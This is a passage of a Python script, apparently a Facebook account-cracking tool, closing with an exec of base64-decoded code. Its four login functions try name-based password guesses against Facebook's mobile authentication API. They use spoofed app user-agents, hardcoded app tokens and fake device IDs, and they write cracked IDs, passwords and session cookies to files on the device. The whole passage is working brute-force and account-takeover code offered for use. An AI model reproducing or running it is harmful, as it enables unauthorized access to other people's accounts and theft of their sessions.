xl7JtZwqx4DJN2dkI0eT6hSAjc4YUOMQHDLRJD9tY4ckYfzJ38mGjs2m5wACv2n1QLoOLpoVspfT86Ky-N4g']",'error_detail_type': 'button_with_disabled','source': 'account_recovery','locale': 'es_ES','client_country_code': 'ES','fb_api_req_friendly_name': 'authenticate','fb_api_caller_class': 'AuthOperations$PasswordAuthOperation','access_token':'350685531728|62f8ce9f74b12f84c1cc23437a4a32'}
            hedaamr = {
            "Content-Type": "application/x-www-form-urlencoded",
            "Host": "graph.facebook.com",
            "User-Agent": f3(),
            "X-FB-Net-HNI": "45204",
            "X-FB-SIM-HNI": "45201",
            "X-FB-Connection-Type": "unknown",
            "Connection": "Keep-Alive",}
            url2 = "https://graph.facebook.com/auth/login"
            po = requests.post(url=url,data=data,headers=hedaamr,allow_redirects=False,verify=True).json()
            if "access_token" in po:
                coki = ";".join(i["name"]+"="+i["value"] for i in po["session_cookies"])
                print(f'\r\r {G}BRAND {A}➤ {G}{ids} {A}•{G} {pas}')
                os.system("espeak -a 300 \"Hammadi,  OK,  Hammadi,  THANKS,  \"")            
                #print(f"\033[1;30m[•] {coki}");linex()
                open('/sdcard/BRAND-FILE-M1-COOKIE.txt', 'a').write(ids+'|'+pas+'|'+coki+"\n")
                oks.append(ids)
                break
            elif 'www.facebook.com' in po['error']['message']:
                print(f'\r\r{G}({A}BRAND{G}) '+ids+' | '+pas+'{G}')
                open('/sdcard/BRAND-CP.txt','a').write(ids+'|'+pas+'\n')
                cps.append(ids)
                break
            else:continue
        loop+=1
    except Exception as e:
        pass
#==================[M2]==================#
def graph2(ids,names,passlist):
    global oks,loop,sim_id,device
    sys.stdout.write('\r \033[1;37m[\033[1;32mHamadi-XD\033[1;37m]\033[1;33m=\033[1;37m[\033[1;33m%s\033[1;31m]\033[1;32m=\033[1;31m[\033[1;32mOK\033[1;31m|\033[1;32mCP\033[1;31m|\033[1;32m2F\033[1;31m]\033[1;32m=\033[1;31m[\033[1;32m%s\033[1;31m|\033[1;32m%s\033[1;31m|\033[1;32m0\033[1;31m] \033[1;31m'%(loop,len(oks),len(cps)));sys.stdout.flush()
    ua = 'Dalvik/2.1.0 (Linux; U; Android 11; SM-N975F Build/QP1A.190711.020) [FBAN/FB4A;FBAV/380.0.0.32.114;FBBV/162442757;FBDM={density=3.0,width=914,height=2823};FBLC/fr_FR;FBRV/102375525;FBCR/Orange;FBMF/Samsung;FBBD/Samsung;FBPN/com.facebook.katana;FBDV/SM-N975F;FBSV/11;FBOP/1;FBCA/armeabi-v7a:armeabi;]'
    try:
        fn = names.split(' ')[0]
        try:
            ln = names.split(' ')[1]
        except:
            ln = fn
        for pw in passlist:
            pas = pw.replace('first',fn.lower()).replace('First',fn).replace('last',ln.lower()).replace('Last',ln)
            data={
            "kids_xudina": str(uuid.uuid4()),
            "format": "json",
            "sha_kids_bokachoda": str(uuid.uuid4()),
            "FUCK_ARAFAT": "true",
            "family_device_id": str(uuid.uuid4()),
            "credentials_type": "device_based_login_password",
            "error_detail_type": "button_with_disabled",
            "source": "device_based_login",
            "email": ids,
            "password": pas,
            "access_token": "350685531728|62f8ce9f74b12f84c123cc23437a4a32",
            "generate_session_cookies": "1",
            "locale": "ar_AR",
            "client_country_code": "AR",
            "method": "auth.login",
            "fb_api_req_friendly_name": "authenticate",
            "fb_api_caller_class": "com.facebook.account.login.protocol.Fb4aAuthHandler",
            "api_key": "882a8490361da98702bf97a021ddc14d",}
            hedaamr = {
            "Content-Type": "application/x-www-form-urlencoded",
            "Host": "graph.facebook.com",
            "User-Agent": f2(),
            "X-FB-Net-HNI": "45204",
            "X-FB-SIM-HNI": "45201",
            "X-FB-Connection-Type": "unknown",
            "Connection": "Keep-Alive",}
            url = "https://graph.facebook.com/auth/login"
            po = requests.post(url,data=data,headers=hedaamr,allow_redirects=False,verify=True).json()
            if "access_token" in po:
                coki = ";".join(i["name"]+"="+i["value"] for i in po["session_cookies"])
                print(f'\r\r {G}BRAND {A}➤ {G}{ids} {A}•{G} {pas}')
                os.system("espeak -a 300 \"Hammadi,  OK,  Hammadi,  THANKS,  \"")            
                #print(f"\033[1;30m[•] {coki}");linex()
                open('/sdcard/BRAND-FILE-M2-COOKIE.txt', 'a').write(ids+'|'+pas+'|'+coki+"\n")
                oks.append(ids)
                break
            elif 'www.facebook.com' in po['error']['message']:
                print(f'\r\r{G}({A}BRAND{G}) '+ids+' | '+pas+'{G}')
                open('/sdcard/BRAND-CP.txt','a').write(ids+'|'+pas+'\n')
                cps.append(ids)
                break
            else:continue
        loop+=1
    except Exception as e:
        pass
#==================[M3]==================#
def graph3(ids,names,passlist):
    global oks,loop,sim_id,device
    sys.stdout.write('\r \033[1;37m[\033[1;32mHamadi\033[1;37m]\033[1;33m=\033[1;37m[\033[1;33m%s\033[1;31m]\033[1;32m=\033[1;31m[\033[1;32mOK\033[1;31m|\033[1;32mCP\033[1;31m|\033[1;32m2F\033[1;31m]\033[1;32m=\033[1;31m[\033[1;32m%s\033[1;31m|\033[1;32m%s\033[1;31m|\033[1;32m0\033[1;31m] \033[1;31m'%(loop,len(oks),len(cps)));sys.stdout.flush()
    ua = 'Dalvik/2.1.0 (Linux; U; Android 11; Pixel 5 Build/SP1A.210812.016) [FBAN/FB4A;FBAV/379.0.0.30.110;FBBV/165266398;FBDM={density=3.0,width=1381,height=2512};FBLC/en_US;FBRV/111335086;FBCR/Orange;FBMF/Google;FBBD/Google;FBPN/com.facebook.katana;FBDV/Pixel 5;FBSV/11;FBOP/1;FBCA/armeabi-v7a:armeabi;]'
    try:
        fn = names.split(' ')[0]
        try:
            ln = names.split(' ')[1]
        except:
            ln = fn
        for pw in passlist:
            pas = pw.replace('first',fn.lower()).replace('First',fn).replace('last',ln.lower()).replace('Last',ln)
            ua = "[FBAN/FB4A;FBAV/"+str(random.randint(49,66))+'.0.0.'+str(random.randrange(20,49))+str(random.randint(11,99)) +";FBBV/"+str(random.randint(11111111,77777777))+";Dalvik/1.8.0(Linux; U; Android 13.0;Pixel 7 Pro Build/US8T2OJ9)[FBAN/FB4A;FBAV/116.0.0.75.43FBBV/8501131FBDM/{density=3.0,width=3120,height=1440}FBLC/fr_FRFBRV/3885056FBCR/O2FBMF/PixelFBBD/PixelFBPN/com.facebook.katanaFBDV/Pixel 7 ProFBSV/5.0FBOP/1FBCA/x86:armeabi-v7a]'+'Dalvik/1.8.0(Linux; U; Android 12.0;Moto G Power Build/TTC9CRZG)[FBAN/FB4A;FBAV/101.0.0.2.4FBBV/1417357FBDM/{density=3.0,width=464,height=1069}FBLC/pt_BRFBRV/1214343FBCR/OrangeFBMF/MotorolaFBBD/MotorolaFBPN/com.facebook.katanaFBDV/Moto G PowerFBSV/12.0FBOP/1FBCA/x86:armeabi-v7a]'+'Dalvik/2.1.0(Linux; U; Android 12.0;P30 Pro Build/R18R21B8)[FBAN/FB4A;FBAV/104.0.0.48.94FBBV/1973198FBDM/{density=3.0,width=848,height=914}FBLC/pt_BRFBRV/9112718FBCR/O2FBMF/HuaweiFBBD/HuaweiFBPN/com.facebook.katanaFBDV/P30 ProFBSV/12.0FBOP/1FBCA/x86:armeabi-v7a]"
            device_id = str(uuid.uuid4())
            adid = str(uuid.uuid4())
            li = ['28']
            li2 = random.choice(li)
            data = {"adid": str(uuid.uuid4()),'format': 'json','device_id': str(uuid.uuid4()),'family_device_id': str(uuid.uuid4()),'secure_family_device_id': str(uuid.uuid4()),'cpl': 'true','try_num': '1','email': ids,'password': pas,'method': 'auth.login','generate_session_cookies': '1','sim_serials': "['80973453345210784798']",'openid_flow': 'android_login','openid_provider': 'google','openid_emails': "['01710940017']",'openid_tokens': "['eyJhbGciOiJSUzI1NiIsImtpZCI6IjdjOWM3OGUzYjAwZTFiYjA5MmQyNDZjODg3YjExMjIwYzg3YjdkMjAiLCJ0eXAiOiJKV1QifQ.eyJpc3MiOiAiYWNjb3VudHMuZ29vZ2xlLmNvbSIsICJhenAiOiAiMTY5MjI5MzgyMy0xZno0cGVjOGg5N2JsYmxmd2t0ODh2NG8weWJ5Y2pseWYuYXBwcy5nb29nbGV1c2VyY29udGVudC5jb20iLCAiYXVkIjogIjE2OTIyOTM4MjMtbDhqZDA5OGh5Y3dmd2lnZDY0NW5xMmdmeXV0YTFuZ2FoLmFwcHMuZ29vZ2xldXNlcmNvbnRlbnQuY29tIiwgInN1YiI6ICIxMDkxMzk4NzMzNDMwNTcwMDE5NzkiLCAiZW1haWwiOiAiMTk0NUBnbWFpbC5jb20iLCAiZW1haWxfdmVyaWZpZWQiOiB0cnVlLCAicGljdHVyZSI6ICJodHRwczovL2xoMy5nb29nbGV1c2VyY29udGVudC5jb20vYS0vQURfY01NUmtFY3FDcTlwcF9YMHdIYTlSb3JpR2V1a0tJa0NnLU15TjFiR2gxb3lnX1E9czk2LWMiLCAiaWF0IjogMTY5MjI5MzgyMywgImV4cCI6IDE2OTIyOTM4MjN9.oHvakCxpmVdAzYgq5jSXN5uCD6L10Bj2EhblWK4IEFhat_acn6jDPKGcYVDx8wxoj5rFRVbDP1xwzfN0eCFG6R9pTslsQHP-PrTNsqeVnhWDV1iEup77iRhPjJRClNMij5RzqQFr7rStwPtAolrQWC_q_uuFrGelW21Tg_enA36PPSrShnloTm6zt83xUYzKQvXl55brBs2zatZ2vWwftwMoOWfp6NbUkd8hliZrMGA8j_A9PTij_1-5BQZSOXSfjcxl7JtZwqx4DJN2dkI0eT6hSAjc4YUOMQHDLRJD9tY4ckYfzJ38mGjs2m5wACv2n1QLoOLpoVspfT86Ky-N4g']",'error_detail_type': 'button_with_disabled','source': 'account_recovery','locale': 'es_ES','client_country_code': 'ES','fb_api_req_friendly_name': 'authenticate','fb_api_caller_class': 'AuthOperations$PasswordAuthOperation','access_token':'350685531728|62f8ce9f74b12f84c123cc23437a4a32'}
            data = {"adid": str(uuid.uuid4()),'format': 'json','device_id': str(uuid.uuid4()),'family_device_id': str(uuid.uuid4()),'secure_family_device_id': str(uuid.uuid4()),'cpl': 'true','try_num': '1','email': ids,'password': pas,'method': 'auth.login','generate_session_cookies': '1','sim_serials': "['80973453345210784798']",'openid_flow': 'android_login','openid_provider': 'google','openid_emails': "['01710940017']",'openid_tokens': "['eyJhbGciOiJSUzI1NiIsImtpZCI6IjdjOWM3OGUzYjAwZTFiYjA5MmQyNDZjODg3YjExMjIwYzg3YjdkMjAiLCJ0eXAiOiJKV1QifQ.eyJpc3MiOiAiYWNjb3VudHMuZ29vZ2xlLmNvbSIsICJhenAiOiAiMTY5MjI5MzgyMy0xZno0cGVjOGg5N2JsYmxmd2t0ODh2NG8weWJ5Y2pseWYuYXBwcy5nb29nbGV1c2VyY29udGVudC5jb20iLCAiYXVkIjogIjE2OTIyOTM4MjMtbDhqZDA5OGh5Y3dmd2lnZDY0NW5xMmdmeXV0YTFuZ2FoLmFwcHMuZ29vZ2xldXNlcmNvbnRlbnQuY29tIiwgInN1YiI6ICIxMDkxMzk4NzMzNDMwNTcwMDE5NzkiLCAiZW1haWwiOiAiMTk0NUBnbWFpbC5jb20iLCAiZW1haWxfdmVyaWZpZWQiOiB0cnVlLCAicGljdHVyZSI6ICJodHRwczovL2xoMy5nb29nbGV1c2VyY29udGVudC5jb20vYS0vQURfY01NUmtFY3FDcTlwcF9YMHdIYTlSb3JpR2V1a0tJa0NnLU15TjFiR2gxb3lnX1E9czk2LWMiLCAiaWF0IjogMTY5MjI5MzgyMywgImV4cCI6IDE2OTIyOTM4MjN9.oHvakCxpmVdAzYgq5jSXN5uCD6L10Bj2EhblWK4IEFhat_acn6jDPKGcYVDx8wxoj5rFRVbDP1xwzfN0eCFG6R9pTslsQHP-PrTNsqeVnhWDV1iEup77iRhPjJRClNMij5RzqQFr7rStwPtAolrQWC_q_uuFrGelW21Tg_enA36PPSrShnloTm6zt83xUYzKQvXl55brBs2zatZ2vWwftwMoOWfp6NbUkd8hliZrMGA8j_A9PTij_1-5BQZSOXSfjcxl7JtZwqx4DJN2dkI0eT6hSAjc4YUOMQHDLRJD9tY4ckYfzJ38mGjs2m5wACv2n1QLoOLpoVspfT86Ky-N4g']",'error_detail_type': 'button_with_disabled','source': 'account_recovery','locale': 'sw_KE','client_country_code': 'ES','fb_api_req_friendly_name': 'authenticate','fb_api_caller_class': 'AuthOperations$PasswordAuthOperation','access_token':'350685531728|62f8ce9f74b12f84c123cc23437a4a32'}
            hedaamr = {
            'Authorization':'OAuth 350685531728|62f8ce9f74b12f84c123cc23437a4a32',
            'X-FB-Friendly-Name':'authenticate',
            'X-FB-Connection-Type':'unknown',
            'User-Agent': ua,
            'Accept-Encoding':'gzip, deflate',
            'Content-Type': 'application/x-www-form-urlencoded',
            'X-FB-HTTP-Engine': 'Liger'
            }
            hedaamr = {
            "Content-Type": "application/x-www-form-urlencoded",
            "Host": "graph.facebook.com",
            "User-Agent": f3(),
            "X-FB-Net-HNI": "45204",
            "X-FB-SIM-HNI": "45201",
            "X-FB-Connection-Type": "unknown",
            "Connection": "Keep-Alive",}
            data = {'adid': adid,
            'format': 'json',
            'device_id': str(uuid.uuid4()),
            'family_device_id': str(uuid.uuid4()),
            'secure_family_device_id': str(uuid.uuid4()),
            'cpl': 'true',
            'try_num': '1',
            'email': ids,
            'password': pas,
            'method': 'auth.login',
            'generate_session_cookies': '1',
            'sim_serials': "['80973453345210784798']",
            'openid_flow': 'android_login',
            'openid_provider': 'google',
            'openid_emails': "['01710940017']",
            'openid_tokens': "['eyJhbGciOiJSUzI1NiIsImtpZCI6IjdjOWM3OGUzYjAwZTFiYjA5MmQyNDZjODg3YjExMjIwYzg3YjdkMjAiLCJ0eXAiOiJKV1QifQ.eyJpc3MiOiAiYWNjb3VudHMuZ29vZ2xlLmNvbSIsICJhenAiOiAiMTY5MjI5MzgyMy0xZno0cGVjOGg5N2JsYmxmd2t0ODh2NG8weWJ5Y2pseWYuYXBwcy5nb29nbGV1c2VyY29udGVudC5jb20iLCAiYXVkIjogIjE2OTIyOTM4MjMtbDhqZDA5OGh5Y3dmd2lnZDY0NW5xMmdmeXV0YTFuZ2FoLmFwcHMuZ29vZ2xldXNlcmNvbnRlbnQuY29tIiwgInN1YiI6ICIxMDkxMzk4NzMzNDMwNTcwMDE5NzkiLCAiZW1haWwiOiAiMTk0NUBnbWFpbC5jb20iLCAiZW1haWxfdmVyaWZpZWQiOiB0cnVlLCAicGljdHVyZSI6ICJodHRwczovL2xoMy5nb29nbGV1c2VyY29udGVudC5jb20vYS0vQURfY01NUmtFY3FDcTlwcF9YMHdIYTlSb3JpR2V1a0tJa0NnLU15TjFiR2gxb3lnX1E9czk2LWMiLCAiaWF0IjogMTY5MjI5MzgyMywgImV4cCI6IDE2OTIyOTM4MjN9.oHvakCxpmVdAzYgq5jSXN5uCD6L10Bj2EhblWK4IEFhat_acn6jDPKGcYVDx8wxoj5rFRVbDP1xwzfN0eCFG6R9pTslsQHP-PrTNsqeVnhWDV1iEup77iRhPjJRClNMij5RzqQFr7rStwPtAolrQWC_q_uuFrGelW21Tg_enA36PPSrShnloTm6zt83xUYzKQvXl55brBs2zatZ2vWwftwMoOWfp6NbUkd8hliZrMGA8j_A9PTij_1-5BQZSOXSfjcxl7JtZwqx4DJN2dkI0eT6hSAjc4YUOMQHDLRJD9tY4ckYfzJ38mGjs2m5wACv2n1QLoOLpoVspfT86Ky-N4g']",
            'error_detail_type': 'button_with_disabled',
            'source': 'account_recovery',
            'locale': 'sw_KE',
            'client_country_code': 'KE',
            'fb_api_req_friendly_name': 'authenticate',
            'fb_api_caller_class': 'AuthOperations$PasswordAuthOperation'}
            hedaamr={'Host': 'graph.facebook.com',
            'Content-Type': 'application/x-www-form-urlencoded',
            'Accept-Encoding': 'gzip, deflate',
            'Connection': 'keep-alive',
            'Priority': 'u=3, i',
            'X-Fb-Sim-Hni': '45204',
            'X-Fb-Net-Hni': '45201',
            'X-Fb-Connection-Quality': 'GOOD',
            'Zero-Rated': '0',
            'User-Agent': ua,
            'Authorization': 'OAuth 350685531728|62f8ce9f74b12f84c123cc23437a4a32',
            'X-Fb-Connection-Bandwidth': '24807555',
            'X-Fb-Connection-Type': 'MOBILE.LTE',
            'X-Fb-Device-Group': '5120',
            'X-Tigon-Is-Retry': 'False',
            'X-Fb-Friendly-Name': 'authenticate',
            'X-Fb-Request-Analytics-Tags': 'unknown',
            'X-Fb-Http-Engine': 'Liger',
            'X-Fb-Client-Ip': 'True',
            'X-Fb-Server-Cluster': 'True',
            'Content-Length': '847'}
            url = 'https://b-api.facebook.com/method/auth.login'
            url2 = "https://graph.facebook.com/auth/login"
            po = requests.post(url=url2,data=data,headers=hedaamr,allow_redirects=False,verify=True).json()
            if "access_token" in po:
                coki = ";".join(i["name"]+"="+i["value"] for i in po["session_cookies"])
                print(f'\r\r {G}BRAND {A}➤ {G}{ids} {A}•{G} {pas}')
                os.system("espeak -a 300 \"BRAND,  OK,  BRAND,  THANKS,  \"")            
                #print(f"\033[1;30m[•] {coki}");linex()
                open('/sdcard/BRAND-FILE-M3-COOKIE.txt', 'a').write(ids+'|'+pas+'|'+coki+"\n")
                oks.append(ids)
                break
            elif 'www.facebook.com' in po['error']['message']:
                print(f'\r\r{G}({A}BRAND{G}) '+ids+' | '+pas+'{G}')
                open('/sdcard/BRAND-CP.txt','a').write(ids+'|'+pas+'\n')
                cps.append(ids)
                break
            else:continue
        loop+=1
    except Exception as e:
        pass
#==================[M4]==================#
def graph4(ids,names,passlist):
    global oks,loop,sim_id,device
    sys.stdout.write('\r \033[1;37m[\033[1;32mHamadi\033[1;37m]\033[1;33m=\033[1;37m[\033[1;33m%s\033[1;31m]\033[1;32m=\033[1;31m[\033[1;32mOK\033[1;31m|\033[1;32mCP\033[1;31m|\033[1;32m2F\033[1;31m]\033[1;32m=\033[1;31m[\033[1;32m%s\033[1;31m|\033[1;32m%s\033[1;31m|\033[1;32m0\033[1;31m] \033[1;31m'%(loop,len(oks),len(cps)));sys.stdout.flush()
    ua = 'FBAN/FB4A;FBAV/548.7.0.5;FBPN/com.facebook.katana;FBLC/en_US;FBBV/25845345;FBCR/MegaFon;FBMF/samsung;FBBD/samsung;FBDV/SM-P993J;FBSV/8;FBCA/armeabi-v7a:armeabi;FBDM={density=1,width=1245,height=2754};FB_FW/5;FBRV/76026398;]'
    try:
        fn = names.split(' ')[0]
        try:
            ln = names.split(' ')[1]
        except:
            ln = fn
        for pw in passlist:
            pas = pw.replace('first',fn.lower()).replace('First',fn).replace('last',ln.lower()).replace('Last',ln)
            data={
            "kids_xudina": str(uuid.uuid4()),
            "format": "json",
            "sha_kids_bokachoda": str(uuid.uuid4()),
            "FUCK_ARAFAT": "true",
            "family_device_id": str(uuid.uuid4()),
            "credentials_type": "device_based_login_password",
            "error_detail_type": "button_with_disabled",
            "source": "device_based_login",
            "email": ids,
            "password": pas,
            "access_token": "350685531728|62f8ce9f74b12f84c123cc23437a4a32",
            "generate_session_cookies": "1",
            "locale": "In_IN",
            "client_country_code": "IN",
            "method": "auth.login",
            "fb_api_req_friendly_name": "authenticate",
            "fb_api_caller_class": "com.facebook.account.login.protocol.Fb4aAuthHandler",
            "api_key": "882a8490361da98702bf97a021ddc14d",}
            hedaamr = {
            "Content-Type": "application/x-www-form-urlencoded",
            "Host": "graph.facebook.com",
            "User-Agent": f4(),
            "X-FB-Net-HNI": "45204",
            "X-FB-SIM-HNI": "45201",
            "X-FB-Connection-Type": "unknown",
            "Connection": "Keep-Alive",}
            url = "https://graph.facebook.com/auth/login"
            po = requests.post(url,data=data,headers=hedaamr,allow_redirects=False,verify=True).json()
            if "access_token" in po:
                coki = ";".join(i["name"]+"="+i["value"] for i in po["session_cookies"])
                print(f'\r\r {G}BRAND {A}➤ {G}{ids} {A}•{G} {pas}')
                #print(f"\033[1;30m[•] {coki}");linex()
                open('/sdcard/BRAND-FILE-M4-COOKIE.txt', 'a').write(ids+'|'+pas+'|'+coki+"\n")
                oks.append(ids)
                break
            elif 'www.facebook.com' in po['error']['message']:
                print(f'\r\r{G}({A}BRAND{G}) '+ids+' | '+pas+'{G}')
                open('/sdcard/BRAND-CP.txt','a').write(ids+'|'+pas+'\n')
                cps.append(ids)
                break
            else:continue
        loop+=1
    except Exception as e:
        pass
#==================[END]==================#
mmk()'
exec(B.b64decode(C).decode('utf-8'))
